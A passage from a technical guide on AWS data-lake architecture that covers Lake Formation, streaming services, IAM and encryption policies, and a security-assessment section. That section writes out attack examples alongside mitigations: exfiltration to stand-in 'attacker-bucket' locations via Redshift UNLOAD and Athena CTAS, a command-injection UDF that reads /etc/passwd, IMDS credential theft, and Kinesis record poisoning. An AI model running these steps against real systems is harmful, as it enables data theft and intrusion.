    VALUES (s.user_id, s.event_type, s.event_timestamp, s.amount);

-- Time travel
SELECT * FROM iceberg_db.user_events FOR TIMESTAMP AS OF TIMESTAMP '2024-06-01 00:00:00';

-- Snapshot-based time travel
SELECT * FROM iceberg_db.user_events FOR VERSION AS OF 123456789;
```

### Lake Formation

Lake Formation provides centralized governance over the data lake:

**Permissions Model:**
```python
import boto3

lf = boto3.client('lakeformation')

# Grant column-level access
lf.grant_permissions(
    Principal={'DataLakePrincipal': {'DataLakePrincipalIdentifier': 'arn:aws:iam::123456789012:role/AnalystRole'}},
    Resource={
        'TableWithColumns': {
            'DatabaseName': 'analytics_db',
            'Name': 'user_events',
            'ColumnNames': ['user_id', 'event_type', 'event_timestamp']
            # 'amount' column excluded — analysts cannot see revenue
        }
    },
    Permissions=['SELECT'],
    PermissionsWithGrantOption=[]
)
```

**Data Filters (row-level and cell-level security):**
```python
# Create a data filter for row-level security
lf.create_data_cells_filter(
    TableData={
        'DatabaseName': 'analytics_db',
        'TableName': 'user_events',
        'Name': 'us-only-filter',
        'RowFilter': {
            'FilterExpression': "region = 'us-east-1' OR region = 'us-west-2'"
        },
        'ColumnNames': ['user_id', 'event_type', 'event_timestamp', 'region'],
        'ColumnWildcard': None  # Explicit columns only
    }
)

# Grant with data filter
lf.grant_permissions(
    Principal={'DataLakePrincipal': {'DataLakePrincipalIdentifier': 'arn:aws:iam::123456789012:role/USAnalyst'}},
    Resource={
        'DataCellsFilter': {
            'DatabaseName': 'analytics_db',
            'TableName': 'user_events',
            'Name': 'us-only-filter'
        }
    },
    Permissions=['SELECT']
)
```

**Cross-Account Sharing:**
```python
# Share database cross-account via RAM
lf.grant_permissions(
    Principal={'DataLakePrincipal': {'DataLakePrincipalIdentifier': '987654321098'}},
    Resource={
        'Database': {'Name': 'analytics_db'}
    },
    Permissions=['DESCRIBE'],
    PermissionsWithGrantOption=['DESCRIBE']
)
```

**Tag-Based Access Control (LF-TBAC):**
```python
# Create LF-Tags
lf.create_lf_tag(TagKey='sensitivity', TagValues=['public', 'internal', 'confidential', 'restricted'])
lf.create_lf_tag(TagKey='domain', TagValues=['finance', 'marketing', 'engineering'])

# Assign tags to resources
lf.add_lf_tags_to_resource(
    Resource={'Table': {'DatabaseName': 'analytics_db', 'Name': 'revenue_data'}},
    LFTags=[
        {'TagKey': 'sensitivity', 'TagValues': ['confidential']},
        {'TagKey': 'domain', 'TagValues': ['finance']}
    ]
)

# Grant via tags (any table tagged finance+confidential)
lf.grant_permissions(
    Principal={'DataLakePrincipal': {'DataLakePrincipalIdentifier': 'arn:aws:iam::123456789012:role/FinanceAnalyst'}},
    Resource={
        'LFTagPolicy': {
            'ResourceType': 'TABLE',
            'Expression': [
                {'TagKey': 'sensitivity', 'TagValues': ['internal', 'confidential']},
                {'TagKey': 'domain', 'TagValues': ['finance']}
            ]
        }
    },
    Permissions=['SELECT', 'DESCRIBE']
)
```

---

## 6. Streaming Services

### Kinesis Data Streams

A real-time data streaming service with configurable shard-level throughput:

- **Shard capacity:** 1 MB/s write, 2 MB/s read (shared among consumers)
- **Enhanced fan-out:** Dedicated 2 MB/s per consumer per shard via HTTP/2 push
- **Retention:** 24 hours default, up to 365 days
- **On-demand mode:** Auto-scales shards, no capacity planning

```python
import boto3
import json
from datetime import datetime

kinesis = boto3.client('kinesis')

# Produce events
def publish_event(stream_name: str, event: dict) -> dict:
    return kinesis.put_record(
        StreamName=stream_name,
        Data=json.dumps(event).encode('utf-8'),
        PartitionKey=event['user_id']  # Determines shard placement
    )

# Batch produce (up to 500 records per call)
def publish_batch(stream_name: str, events: list[dict]) -> dict:
    records = [
        {
            'Data': json.dumps(e).encode('utf-8'),
            'PartitionKey': e['user_id']
        }
        for e in events
    ]
    return kinesis.put_records(StreamName=stream_name, Records=records)

# Enhanced fan-out consumer registration
kinesis.register_stream_consumer(
    StreamARN='arn:aws:kinesis:us-east-1:123456789012:stream/user-events',
    ConsumerName='analytics-consumer'
)
```

**Terraform for Kinesis with encryption:**
```hcl
resource "aws_kinesis_stream" "events" {
  name             = "user-events"
  shard_count      = 4
  retention_period = 168  # 7 days

  stream_mode_details {
    stream_mode = "PROVISIONED"
  }

  encryption_type = "KMS"
  kms_key_id      = aws_kms_key.kinesis.id

  shard_level_metrics = [
    "IncomingBytes",
    "IncomingRecords",
    "IteratorAgeMilliseconds",
    "OutgoingBytes",
    "OutgoingRecords",
    "ReadProvisionedThroughputExceeded",
    "WriteProvisionedThroughputExceeded"
  ]
}
```

### Kinesis Data Firehose

Managed delivery stream — no consumer code required. Transforms and delivers to S3, Redshift, OpenSearch, Splunk, or HTTP endpoints:

```hcl
resource "aws_kinesis_firehose_delivery_stream" "s3_delivery" {
  name        = "events-to-s3"
  destination = "extended_s3"

  kinesis_source_configuration {
    kinesis_stream_arn = aws_kinesis_stream.events.arn
    role_arn           = aws_iam_role.firehose.arn
  }

  extended_s3_configuration {
    role_arn        = aws_iam_role.firehose.arn
    bucket_arn      = aws_s3_bucket.data_lake["raw"].arn
    prefix          = "events/year=!{timestamp:yyyy}/month=!{timestamp:MM}/day=!{timestamp:dd}/"
    error_output_prefix = "errors/!{firehose:error-output-type}/year=!{timestamp:yyyy}/"
    buffering_size  = 128  # MB
    buffering_interval = 60  # seconds
    compression_format = "SNAPPY"

    # Data format conversion (JSON → Parquet)
    data_format_conversion_configuration {
      enabled = true

      input_format_configuration {
        deserializer {
          open_x_json_ser_de {}
        }
      }

      output_format_configuration {
        serializer {
          parquet_ser_de {
            compression = "SNAPPY"
          }
        }
      }

      schema_configuration {
        database_name = aws_glue_catalog_database.analytics.name
        table_name    = aws_glue_catalog_table.events.name
        role_arn      = aws_iam_role.firehose.arn
      }
    }

    # Lambda transformation
    processing_configuration {
      enabled = true
      processors {
        type = "Lambda"
        parameters {
          parameter_name  = "LambdaArn"
          parameter_value = "${aws_lambda_function.transform.arn}:$LATEST"
        }
      }
    }
  }
}
```

### Amazon MSK (Managed Streaming for Apache Kafka)

Fully managed Kafka service with:
- Automatic broker patching
- Multi-AZ replication
- Tiered storage (offload cold segments to S3)
- MSK Serverless (auto-scaling, no broker management)

```hcl
resource "aws_msk_cluster" "events" {
  cluster_name           = "events-cluster"
  kafka_version          = "3.6.0"
  number_of_broker_nodes = 6

  broker_node_group_info {
    instance_type   = "kafka.m5.2xlarge"
    client_subnets  = aws_subnet.private[*].id
    security_groups = [aws_security_group.msk.id]

    storage_info {
      ebs_storage_info {
        volume_size = 500
        provisioned_throughput {
          enabled           = true
          volume_throughput  = 250
        }
      }
    }

    connectivity_info {
      public_access {
        type = "DISABLED"
      }
    }
  }

  encryption_info {
    encryption_at_rest_kms_key_arn = aws_kms_key.msk.arn
    encryption_in_transit {
      client_broker = "TLS"
      in_cluster    = true
    }
  }

  configuration_info {
    arn      = aws_msk_configuration.events.arn
    revision = aws_msk_configuration.events.latest_revision
  }

  logging_info {
    broker_logs {
      cloudwatch_logs {
        enabled   = true
        log_group = aws_cloudwatch_log_group.msk.name
      }
      s3 {
        enabled = true
        bucket  = aws_s3_bucket.msk_logs.id
        prefix  = "msk-broker-logs"
      }
    }
  }
}
```

### MSK Connect

Deploy Kafka Connect connectors as managed services:

```bash
# Create a custom plugin from S3
aws kafkaconnect create-custom-plugin \
  --name s3-sink-plugin \
  --content-type JAR \
  --location "s3BucketArn=arn:aws:s3:::kafka-connect-plugins,fileKey=confluentinc-kafka-connect-s3-10.5.0.zip"

# Deploy connector
aws kafkaconnect create-connector \
  --connector-name events-s3-sink \
  --kafka-cluster '{"apacheKafkaCluster":{"bootstrapServers":"b-1.events.abc123.kafka.us-east-1.amazonaws.com:9096","vpc":{"subnets":["subnet-abc"],"securityGroups":["sg-xyz"]}}}' \
  --connector-configuration '{
    "connector.class": "io.confluent.connect.s3.S3SinkConnector",
    "tasks.max": "4",
    "topics": "user-events",
    "s3.bucket.name": "company-datalake-raw",
    "s3.region": "us-east-1",
    "storage.class": "io.confluent.connect.s3.storage.S3Storage",
    "format.class": "io.confluent.connect.s3.format.parquet.ParquetFormat",
    "partitioner.class": "io.confluent.connect.storage.partitioner.TimeBasedPartitioner",
    "partition.duration.ms": "3600000",
    "path.format": "year=YYYY/month=MM/day=dd/hour=HH",
    "locale": "en-US",
    "timezone": "UTC"
  }' \
  --capacity '{"autoScaling":{"minWorkerCount":1,"maxWorkerCount":4,"scaleInPolicy":{"cpuUtilizationPercentage":20},"scaleOutPolicy":{"cpuUtilizationPercentage":80},"mcuCount":2}}'
```

### EventBridge

Event-driven routing for AWS service events and custom application events:

```hcl
resource "aws_cloudwatch_event_rule" "s3_upload" {
  name        = "data-lake-upload-trigger"
  description = "Trigger processing when new data lands in S3"

  event_pattern = jsonencode({
    source      = ["aws.s3"]
    detail-type = ["Object Created"]
    detail = {
      bucket = { name = ["company-datalake-raw"] }
      object = { key = [{ prefix = "incoming/" }] }
    }
  })
}

resource "aws_cloudwatch_event_target" "step_function" {
  rule      = aws_cloudwatch_event_rule.s3_upload.name
  target_id = "TriggerETL"
  arn       = aws_sfn_state_machine.etl_pipeline.arn
  role_arn  = aws_iam_role.eventbridge.arn

  input_transformer {
    input_paths = {
      bucket = "$.detail.bucket.name"
      key    = "$.detail.object.key"
    }
    input_template = <<EOF
{
  "source_bucket": "<bucket>",
  "source_key": "<key>"
}
EOF
  }
}
```

### Real-Time Analytics Patterns

**Lambda Architecture (batch + speed layer):**
```
                    ┌─ Kinesis → Lambda → DynamoDB (speed layer, low latency)
Producers → MSK ──┤
                    └─ Firehose → S3 → Glue ETL → Redshift (batch layer, accuracy)

Query: DynamoDB (recent) UNION Redshift (historical)
```

**Kappa Architecture (streaming only):**
```
Producers → Kinesis → Flink (KDA) → Iceberg on S3 → Athena
                                   → DynamoDB (materialized views)
```

### Kinesis Data Analytics (Managed Apache Flink)

For stateful stream processing with windowing, joins, and complex event processing:

```python
# Flink application — PyFlink for KDA
from pyflink.table import EnvironmentSettings, TableEnvironment
from pyflink.table.window import Tumble
from pyflink.table.expressions import col, lit

env_settings = EnvironmentSettings.in_streaming_mode()
t_env = TableEnvironment.create(env_settings)

# Define Kinesis source
t_env.execute_sql("""
    CREATE TABLE user_events (
        user_id STRING,
        event_type STRING,
        amount DECIMAL(12, 2),
        event_time TIMESTAMP(3),
        WATERMARK FOR event_time AS event_time - INTERVAL '5' SECOND
    ) WITH (
        'connector' = 'kinesis',
        'stream' = 'user-events',
        'aws.region' = 'us-east-1',
        'scan.stream.initpos' = 'LATEST',
        'format' = 'json'
    )
""")

# Define S3 sink (Iceberg)
t_env.execute_sql("""
    CREATE TABLE aggregated_events (
        window_start TIMESTAMP(3),
        window_end TIMESTAMP(3),
        event_type STRING,
        event_count BIGINT,
        total_amount DECIMAL(12, 2)
    ) WITH (
        'connector' = 'filesystem',
        'path' = 's3://company-datalake-curated/aggregated/',
        'format' = 'parquet',
        'sink.partition-commit.policy.kind' = 'success-file',
        'sink.rolling-policy.file-size' = '128MB'
    )
""")

# Tumbling window aggregation
t_env.execute_sql("""
    INSERT INTO aggregated_events
    SELECT
        TUMBLE_START(event_time, INTERVAL '5' MINUTE) AS window_start,
        TUMBLE_END(event_time, INTERVAL '5' MINUTE) AS window_end,
        event_type,
        COUNT(*) AS event_count,
        SUM(amount) AS total_amount
    FROM user_events
    GROUP BY TUMBLE(event_time, INTERVAL '5' MINUTE), event_type
""")
```

### Consumer Patterns for Kinesis

**KCL (Kinesis Client Library) consumer with checkpointing:**
```python
# Simplified KCL v2 consumer pattern (Java/Python multilang daemon)
# For production, use the KCL library directly

import boto3
import time
from datetime import datetime

kinesis = boto3.client('kinesis')

def process_shard(stream_name: str, shard_id: str, checkpoint_table: str):
    """Process records from a single shard with checkpointing."""
    dynamodb = boto3.resource('dynamodb')
    table = dynamodb.Table(checkpoint_table)
    
    # Get last checkpoint
    checkpoint = table.get_item(Key={'shard_id': shard_id}).get('Item', {})
    iterator_type = 'AFTER_SEQUENCE_NUMBER' if 'sequence_number' in checkpoint else 'TRIM_HORIZON'
    
    kwargs = {'StreamName': stream_name, 'ShardId': shard_id, 'ShardIteratorType': iterator_type}
    if 'sequence_number' in checkpoint:
        kwargs['StartingSequenceNumber'] = checkpoint['sequence_number']
    
    shard_iterator = kinesis.get_shard_iterator(**kwargs)['ShardIterator']
    
    while shard_iterator:
        response = kinesis.get_records(ShardIterator=shard_iterator, Limit=100)
        records = response['Records']
        
        for record in records:
            # Process record
            data = record['Data']
            # ... business logic ...
        
        # Checkpoint after processing batch
        if records:
            table.put_item(Item={
                'shard_id': shard_id,
                'sequence_number': records[-1]['SequenceNumber'],
                'last_updated': datetime.utcnow().isoformat()
            })
        
        shard_iterator = response.get('NextShardIterator')
        
        if not records:
            time.sleep(1)  # Avoid empty polls
```

---

## 7. Security Architecture

### IAM Policies for Data Services

**Least-privilege S3 access:**
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "ReadCuratedData",
      "Effect": "Allow",
      "Action": [
        "s3:GetObject",
        "s3:GetObjectVersion"
      ],
      "Resource": "arn:aws:s3:::company-datalake-curated/events/*",
      "Condition": {
        "StringEquals": {
          "s3:ExistingObjectTag/classification": "internal"
        }
      }
    },
    {
      "Sid": "ListBucketLimited",
      "Effect": "Allow",
      "Action": "s3:ListBucket",
      "Resource": "arn:aws:s3:::company-datalake-curated",
      "Condition": {
        "StringLike": {
          "s3:prefix": ["events/*"]
        }
      }
    }
  ]
}
```

**Deny unencrypted uploads:**
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyUnencryptedUploads",
      "Effect": "Deny",
      "Action": "s3:PutObject",
      "Resource": "arn:aws:s3:::company-datalake-*/*",
      "Condition": {
        "StringNotEquals": {
          "s3:x-amz-server-side-encryption": "aws:kms"
        }
      }
    },
    {
      "Sid": "DenyWrongKMSKey",
      "Effect": "Deny",
      "Action": "s3:PutObject",
      "Resource": "arn:aws:s3:::company-datalake-*/*",
      "Condition": {
        "StringNotEquals": {
          "s3:x-amz-server-side-encryption-aws-kms-key-id": "arn:aws:kms:us-east-1:123456789012:key/mrk-abc123"
        }
      }
    }
  ]
}
```

**Glue job role — minimal permissions:**
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "GlueJobReadSource",
      "Effect": "Allow",
      "Action": ["s3:GetObject"],
      "Resource": "arn:aws:s3:::company-datalake-raw/events/*"
    },
    {
      "Sid": "GlueJobWriteTarget",
      "Effect": "Allow",
      "Action": ["s3:PutObject", "s3:DeleteObject"],
      "Resource": "arn:aws:s3:::company-datalake-curated/events/*"
    },
    {
      "Sid": "GlueCatalogAccess",
      "Effect": "Allow",
      "Action": [
        "glue:GetTable",
        "glue:GetPartitions",
        "glue:CreatePartition",
        "glue:BatchCreatePartition"
      ],
      "Resource": [
        "arn:aws:glue:us-east-1:123456789012:catalog",
        "arn:aws:glue:us-east-1:123456789012:database/analytics_db",
        "arn:aws:glue:us-east-1:123456789012:table/analytics_db/*"
      ]
    },
    {
      "Sid": "KMSDecryptEncrypt",
      "Effect": "Allow",
      "Action": ["kms:Decrypt", "kms:GenerateDataKey"],
      "Resource": "arn:aws:kms:us-east-1:123456789012:key/mrk-abc123"
    }
  ]
}
```

### Encryption

**Encryption at rest options:**

| Method | Key Management | Performance | Use Case |
|--------|---------------|-------------|----------|
| SSE-S3 (AES-256) | AWS-managed, no control | Fastest | Default for non-sensitive data |
| SSE-KMS (aws/s3 key) | AWS-managed CMK | Slight overhead | Audit trail needed |
| SSE-KMS (custom CMK) | Customer-managed | Slight overhead | Cross-account, rotation control |
| CSE (client-side) | Customer-managed entirely | Client CPU cost | Zero-trust to AWS |

**KMS key policy for data lake:**
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "KeyAdministrators",
      "Effect": "Allow",
      "Principal": {"AWS": "arn:aws:iam::123456789012:role/KeyAdmin"},
      "Action": ["kms:Create*", "kms:Describe*", "kms:Enable*", "kms:List*", "kms:Put*", "kms:Update*", "kms:Revoke*", "kms:Disable*", "kms:Get*", "kms:Delete*", "kms:ScheduleKeyDeletion", "kms:CancelKeyDeletion"],
      "Resource": "*"
    },
    {
      "Sid": "DataServiceUsage",
      "Effect": "Allow",
      "Principal": {"AWS": [
        "arn:aws:iam::123456789012:role/GlueETLRole",
        "arn:aws:iam::123456789012:role/RedshiftRole",
        "arn:aws:iam::123456789012:role/AthenaRole"
      ]},
      "Action": ["kms:Decrypt", "kms:GenerateDataKey", "kms:DescribeKey"],
      "Resource": "*",
      "Condition": {
        "StringEquals": {
          "kms:ViaService": [
            "s3.us-east-1.amazonaws.com",
            "glue.us-east-1.amazonaws.com"
          ]
        }
      }
    },
    {
      "Sid": "DenyExternalAccounts",
      "Effect": "Deny",
      "Principal": "*",
      "Action": "kms:*",
      "Resource": "*",
      "Condition": {
        "StringNotEquals": {
          "aws:PrincipalOrgID": "o-abc123def4"
        }
      }
    }
  ]
}
```

### Transport Encryption (In-Transit)

Force TLS on all S3 operations via bucket policy:

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Sid": "DenyInsecureTransport",
    "Effect": "Deny",
    "Principal": "*",
    "Action": "s3:*",
    "Resource": [
      "arn:aws:s3:::company-datalake-*",
      "arn:aws:s3:::company-datalake-*/*"
    ],
    "Condition": {
      "Bool": { "aws:SecureTransport": "false" }
    }
  },
  {
    "Sid": "DenyOutdatedTLS",
    "Effect": "Deny",
    "Principal": "*",
    "Action": "s3:*",
    "Resource": [
      "arn:aws:s3:::company-datalake-*",
      "arn:aws:s3:::company-datalake-*/*"
    ],
    "Condition": {
      "NumericLessThan": { "s3:TlsVersion": "1.2" }
    }
  }]
}
```

Redshift requires SSL connections:
```sql
-- Force SSL for all users in parameter group
-- Set require_ssl = true in cluster parameter group

-- Verify SSL enforcement
SELECT name, setting FROM pg_settings WHERE name = 'require_ssl';

-- Per-user SSL enforcement
ALTER USER analyst_user SET require_ssl TO true;
```

### Cross-Account Access Patterns

**Secure cross-account data access via roles (not bucket policies with external accounts):**

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Sid": "AllowCrossAccountAssumeRole",
    "Effect": "Allow",
    "Principal": { "AWS": "arn:aws:iam::987654321098:root" },
    "Action": "sts:AssumeRole",
    "Condition": {
      "StringEquals": { "sts:ExternalId": "secure-random-external-id-abc123" },
      "Bool": { "aws:MultiFactorAuthPresent": "true" }
    }
  }]
}
```

This pattern is superior to bucket policies granting cross-account access because:
- External ID prevents confused deputy attacks
- MFA can be required
- CloudTrail logs show which principal assumed the role
- Access can be revoked by deleting the role, not modifying multiple bucket policies

### VPC Endpoints

**Gateway endpoints (S3, DynamoDB) — free, route-table based:**
```hcl
resource "aws_vpc_endpoint" "s3" {
  vpc_id       = aws_vpc.analytics.id
  service_name = "com.amazonaws.us-east-1.s3"
  vpc_endpoint_type = "Gateway"
  route_table_ids   = aws_route_table.private[*].id

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid       = "AllowDataLakeBucketsOnly"
        Effect    = "Allow"
        Principal = "*"
        Action    = ["s3:GetObject", "s3:PutObject", "s3:ListBucket"]
        Resource  = [
          "arn:aws:s3:::company-datalake-*",
          "arn:aws:s3:::company-datalake-*/*"
        ]
      },
      {
        Sid       = "DenyAllOtherBuckets"
        Effect    = "Deny"
        Principal = "*"
        Action    = "s3:*"
        NotResource = [
          "arn:aws:s3:::company-datalake-*",
          "arn:aws:s3:::company-datalake-*/*"
        ]
      }
    ]
  })
}
```

**Interface endpoints (Glue, KMS, STS, etc.) — ENI-based, PrivateLink:**
```hcl
resource "aws_vpc_endpoint" "glue" {
  vpc_id              = aws_vpc.analytics.id
  service_name        = "com.amazonaws.us-east-1.glue"
  vpc_endpoint_type   = "Interface"
  subnet_ids          = aws_subnet.private[*].id
  security_group_ids  = [aws_security_group.vpce.id]
  private_dns_enabled = true
}

resource "aws_vpc_endpoint" "kms" {
  vpc_id              = aws_vpc.analytics.id
  service_name        = "com.amazonaws.us-east-1.kms"
  vpc_endpoint_type   = "Interface"
  subnet_ids          = aws_subnet.private[*].id
  security_group_ids  = [aws_security_group.vpce.id]
  private_dns_enabled = true
}

resource "aws_security_group" "vpce" {
  name_prefix = "vpce-"
  vpc_id      = aws_vpc.analytics.id

  ingress {
    from_port       = 443
    to_port         = 443
    protocol        = "tcp"
    cidr_blocks     = [aws_vpc.analytics.cidr_block]
  }
}
```

### Network Isolation

Complete network isolation pattern for data workloads:

```hcl
# No internet gateway — fully private VPC
resource "aws_vpc" "data_vpc" {
  cidr_block           = "10.0.0.0/16"
  enable_dns_support   = true
  enable_dns_hostnames = true
}

# No NAT gateway — all traffic through VPC endpoints
# Required endpoints: s3, glue, kms, sts, logs, monitoring, redshift, kinesis
```

### Service Control Policies (SCPs)

Organization-level guardrails preventing data exfiltration:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyS3ExfilToExternalAccounts",
      "Effect": "Deny",
      "Action": [
        "s3:PutBucketPolicy",
        "s3:PutBucketAcl",
        "s3:PutObjectAcl"
      ],
      "Resource": "*",
      "Condition": {
        "StringNotEquals": {
          "aws:PrincipalOrgID": "o-abc123def4"
        }
      }
    },
    {
      "Sid": "DenyLeaveOrg",
      "Effect": "Deny",
      "Action": "organizations:LeaveOrganization",
      "Resource": "*"
    },
    {
      "Sid": "RequireIMDSv2",
      "Effect": "Deny",
      "Action": "ec2:RunInstances",
      "Resource": "arn:aws:ec2:*:*:instance/*",
      "Condition": {
        "StringNotEquals": {
          "ec2:MetadataHttpTokens": "required"
        }
      }
    },
    {
      "Sid": "DenyUnencryptedDataStores",
      "Effect": "Deny",
      "Action": [
        "redshift:CreateCluster",
        "rds:CreateDBInstance",
        "kinesis:CreateStream"
      ],
      "Resource": "*",
      "Condition": {
        "Bool": {
          "redshift:Encrypted": "false",
          "rds:StorageEncrypted": "false"
        }
      }
    }
  ]
}
```

---

## 8. Security Assessment

### S3 Bucket Misconfigurations

**Public access via ACLs:**

The most common S3 vulnerability is unintended public access. Even with `BlockPublicAccess` at the account level, individual bucket settings can override if the account-level setting was not enforced:

```bash
# Enumerate all buckets and check public access block
aws s3api list-buckets --query 'Buckets[].Name' --output text | tr '\t' '\n' | while read bucket; do
  echo "=== $bucket ==="
  aws s3api get-public-access-block --bucket "$bucket" 2>/dev/null || echo "NO PUBLIC ACCESS BLOCK CONFIGURED"
  aws s3api get-bucket-acl --bucket "$bucket" --query 'Grants[?Grantee.URI==`http://acs.amazonaws.com/groups/global/AllUsers` || Grantee.URI==`http://acs.amazonaws.com/groups/global/AuthenticatedUsers`]'
done
```

**Bucket policy allowing wildcard principals:**

```python
import boto3
import json

s3 = boto3.client('s3')

def assess_bucket_policies():
    findings = []
    for bucket in s3.list_buckets()['Buckets']:
        name = bucket['Name']
        try:
            policy = json.loads(s3.get_bucket_policy(Bucket=name)['Policy'])
            for stmt in policy.get('Statement', []):
                principal = stmt.get('Principal', '')
                if principal == '*' or principal == {'AWS': '*'}:
                    if 'Condition' not in stmt:
                        findings.append({
                            'bucket': name,
                            'severity': 'CRITICAL',
                            'issue': f"Wildcard principal without conditions: {stmt.get('Sid', 'unnamed')}",
                            'action': stmt.get('Action')
                        })
        except s3.exceptions.from_code('NoSuchBucketPolicy'):
            pass
    return findings
```

**Object-level ACL grants surviving bucket policy restrictions:**

Even with a restrictive bucket policy, legacy object ACLs set during upload can grant access. The fix is `BucketOwnerEnforced` object ownership:

```bash
# Check object ownership setting
aws s3api get-bucket-ownership-controls --bucket company-datalake-raw

# Remediate: enforce bucket owner for all objects
aws s3api put-bucket-ownership-controls --bucket company-datalake-raw \
  --ownership-controls '{"Rules":[{"ObjectOwnership":"BucketOwnerEnforced"}]}'
```

### IAM Privilege Escalation in Data Services

**Path 1: Glue job role with iam:PassRole to itself**

If a Glue job role can pass itself to new Glue jobs, an attacker who compromises the job can create new jobs with escalated access:

```json
{
  "Effect": "Allow",
  "Action": "iam:PassRole",
  "Resource": "arn:aws:iam::123456789012:role/GlueETLRole",
  "Condition": {
    "StringEquals": {
      "iam:PassedToService": "glue.amazonaws.com"
    }
  }
}
```

**Exploitation:** Attacker modifies Glue job script to assume other roles or exfiltrate data to an external bucket.

**Mitigation:** Separate Glue execution roles per job category. Deny `glue:UpdateJob` and `glue:CreateJob` from the execution role itself.

**Path 2: Redshift COPY with overprivileged IAM role**

If the Redshift cluster role has broad S3 access, any user with SQL access can COPY from any accessible bucket:

```sql
-- An attacker with Redshift SQL access exfiltrates data
COPY exfil_table FROM 's3://other-team-confidential-bucket/secrets/'
IAM_ROLE 'arn:aws:iam::123456789012:role/RedshiftRole'
FORMAT AS CSV;

UNLOAD ('SELECT * FROM exfil_table')
TO 's3://attacker-bucket/stolen/'
IAM_ROLE 'arn:aws:iam::123456789012:role/RedshiftRole';
```

**Mitigation:** Scope Redshift IAM roles with S3 resource restrictions. Use separate roles for COPY (read) and UNLOAD (write) with different bucket scopes.

**Path 3: Lambda with AmazonS3FullAccess**

Lambda functions invoked by data pipelines often accumulate permissions. A vulnerable dependency allows RCE → full S3 access.

### Redshift SQL Injection via UDFs

Scalar User-Defined Functions (UDFs) in Redshift execute Python. If inputs are not parameterized:

```sql
-- Vulnerable UDF
CREATE OR REPLACE FUNCTION unsafe_lookup(user_input VARCHAR)
RETURNS VARCHAR
STABLE
AS $$
  import subprocess
  # NEVER do this — command injection
  result = subprocess.check_output(f"echo {user_input}", shell=True)
  return result.decode()
$$ LANGUAGE plpythonu;

-- Attacker input: '; cat /etc/passwd #
SELECT unsafe_lookup('''; cat /etc/passwd #''');
```

**Mitigation:**
- Never use `subprocess` or `os.system` in UDFs
- Validate and sanitize all UDF inputs
- Use `IMMUTABLE` or `STABLE` volatility to limit side effects
- Restrict `CREATE FUNCTION` privileges to trusted roles

### Glue Job Credential Theft

Glue jobs run on managed Spark clusters with an IAM role attached. The instance metadata service (IMDS) provides temporary credentials:

```python
# Inside a compromised Glue job
import requests

# Glue uses a modified IMDS endpoint
# The role credentials are accessible at:
creds = requests.get(
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/GlueETLRole'
).json()

# Attacker now has AccessKeyId, SecretAccessKey, Token
# Can use from outside AWS with these temporary credentials
```

**Mitigation:**
- Apply VPC configuration to Glue jobs (blocks internet access)
- Use VPC endpoints for all required services
- Monitor Glue job network traffic via VPC Flow Logs
- Implement credential rotation and short session durations
- Use Glue job security configurations for encryption

### Athena CTAS Exfiltration

An attacker with Athena query access can exfiltrate data by creating tables in attacker-controlled locations:

```sql
-- Attacker has SELECT on sensitive table, writes to their own bucket
CREATE TABLE attacker_db.stolen_data
WITH (
    external_location = 's3://attacker-controlled-bucket/exfil/',
    format = 'PARQUET'
) AS
SELECT * FROM sensitive_db.customer_pii;
```

**Mitigation:**
- Restrict Athena workgroup result locations
- Use Lake Formation to control table creation permissions
- Deny `s3:PutObject` to non-approved buckets via IAM/SCP
- Monitor CTAS/INSERT INTO queries in Athena query logs

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Sid": "RestrictAthenaOutputLocation",
    "Effect": "Deny",
    "Action": "s3:PutObject",
    "NotResource": [
      "arn:aws:s3:::approved-athena-results/*",
      "arn:aws:s3:::company-datalake-curated/*"
    ],
    "Condition": {
      "StringEquals": {
        "aws:CalledVia": "athena.amazonaws.com"
      }
    }
  }]
}
```

### Lake Formation Permission Bypass

**Bypass via direct S3 access:**

Lake Formation permissions are enforced at the catalog query layer (Athena, Redshift Spectrum, EMR). If a principal has direct `s3:GetObject` on the underlying data, Lake Formation controls are bypassed entirely.

**Mitigation:**
- Remove direct S3 IAM permissions from analyst roles
- Use Lake Formation as the sole permission mechanism
- Enable "Use only IAM access control" = FALSE for all databases
- Register data locations with Lake Formation

**Bypass via Glue API:**

`glue:GetTable` returns the S3 location. If the caller also has `s3:GetObject`, they can read data without going through the governed query path.

### Kinesis Data Stream Poisoning

An attacker with `kinesis:PutRecord` access can inject malicious records that exploit downstream consumers:

```python
# Attack: Inject oversized or malformed records to crash consumers
import boto3
import json

kinesis = boto3.client('kinesis')

# Scenario 1: JSON injection causing parser errors in Flink/Lambda
malicious_payload = {
    "user_id": "legit_user",
    "event_type": "purchase",
    "amount": "NaN",  # Causes numeric parse failures
    "properties": {"key": "\x00" * 10000}  # Null bytes crash some parsers
}

# Scenario 2: Partition key manipulation for hot shard
# All records to same shard overwhelms single consumer
for i in range(10000):
    kinesis.put_record(
        StreamName='user-events',
        Data=json.dumps(malicious_payload).encode(),
        PartitionKey='AAAA'  # Deterministic: always same shard
    )
```

**Mitigation:**
- Validate record schemas using Glue Schema Registry (enforce at producer)
- Implement dead-letter queues in consumers for malformed records
- Use enhanced fan-out to isolate consumer throughput
- Monitor `WriteProvisionedThroughputExceeded` per shard for hot-shard attacks
- Apply IAM conditions restricting `kinesis:PutRecord` to specific source VPCs

### Redshift Data Sharing Abuse

If data sharing is configured without consumer-side restrictions:

```sql
-- Attacker on consumer cluster can query all shared data
-- No row-level security from producer is enforced on consumer side
SELECT * FROM shared_database.public.customer_pii;

-- Export to attacker-controlled storage
UNLOAD ('SELECT * FROM shared_database.public.customer_pii')
TO 's3://attacker-bucket/exfil/'
IAM_ROLE 'arn:aws:iam::987654321098:role/ConsumerRedshiftRole';
```

**Mitigation:**
- Use object-level sharing (specific tables/views only)
- Create views with filtering on the producer before sharing
- Monitor `SVL_DATASHARE_USAGE_CONSUMER` for access patterns
- Implement network policies on consumer clusters restricting UNLOAD destinations

### IMDS v1 Exploitation on EMR

EMR clusters running with IMDSv1 (default on older configurations) are vulnerable to SSRF-based credential theft:

```bash
# SSRF from a Spark job or Jupyter notebook on EMR
